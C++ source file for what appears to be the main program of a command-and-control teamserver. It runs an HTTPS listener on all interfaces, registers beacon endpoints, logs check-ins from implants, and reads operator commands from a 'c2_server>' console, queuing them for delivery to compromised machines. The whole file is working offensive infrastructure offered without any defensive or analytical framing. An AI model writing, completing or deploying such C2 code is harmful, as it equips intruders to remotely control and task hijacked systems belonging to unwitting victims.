#include <httplib.h>

#include <cstdint>
#include <iostream>
#include <string>
#include <thread>

#include "beaconEndpoints.hpp"

namespace
{
constexpr const char *kCertPath = "certs/server.pem";
constexpr const char *kKeyPath = "certs/server.key";

// Read operator commands from the console and queue them.
void operator_input()
{
    std::string line;
    for (;;)
    {
        std::cout << "c2_server> " << std::flush;
        if (!std::getline(std::cin, line))
            return;
        if (line.empty())
            continue;

        const bool exiting = line == "exit";
        if (exiting)
            request_exit();
        else
            queue_command(line);

        if (exiting)
            return;
    }
}

// Report each request so beacons are visible in the console.
void log_request(const httplib::Request &req, const httplib::Response &res)
{
    std::cout << "[*] " << req.method << " " << req.path << " -> " << res.status
              << "\n"
              << std::flush;
}
} // namespace

int main()
{
    httplib::SSLServer server(kCertPath, kKeyPath);
    if (!server.is_valid())
    {
        std::cerr << "[-] Failed to load " << kCertPath << " / " << kKeyPath
                  << "\n";
        return 1;
    }

    server.set_payload_max_length(kMaxPayload);
    server.set_logger(log_request);
    register_all_beacon_endpoints(server);

    std::thread input_thread(operator_input);
    input_thread.detach();

    std::cout << "[*] Linux C++ Teamserver listening on https://0.0.0.0:" << kPort
              << "\n";

    if (!server.listen("0.0.0.0", kPort))
    {
        std::cerr << "[-] Failed to listen on port " << kPort << "\n";
        return 1;
    }
    return 0;
}
